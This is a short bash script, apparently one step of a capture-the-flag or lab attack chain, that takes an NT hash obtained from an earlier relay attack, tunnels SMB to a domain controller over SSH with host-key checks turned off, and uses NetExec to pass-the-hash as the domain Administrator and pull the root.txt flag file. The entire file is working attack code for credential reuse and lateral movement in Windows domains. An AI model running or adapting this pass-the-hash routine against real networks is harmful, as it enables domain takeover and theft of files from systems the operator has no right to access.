#!/bin/bash
# After a relay dump: PTH Administrator to DC01 via SSH -L.
# Usage: ./08-pth-root.sh <NT_HASH>
set -euo pipefail
. "$(dirname "$0")/00-env.sh"
HASH="${1:-}"
[[ -n "$HASH" ]] || { echo "usage: $0 <NT_HASH>"; exit 1; }

echo "[*] SSH -L DC01:445"
pkill -f "14445:${DC01}:445" 2>/dev/null || true
ssh -p 2222 -i "$SSH_KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ExitOnForwardFailure=yes -f -N -L 127.0.0.1:14445:"$DC01":445 root@127.0.0.1

echo "[*] PTH Administrator"
nxc smb 127.0.0.1 --port 14445 -u Administrator -H "$HASH" -d "$DOMAIN" --timeout 10
nxc smb 127.0.0.1 --port 14445 -u Administrator -H "$HASH" -d "$DOMAIN" \
  --get-file 'C:\Users\Administrator\Desktop\root.txt' "$LOOT/root.txt"
echo "[+] wrote $LOOT/root.txt (not printed)"
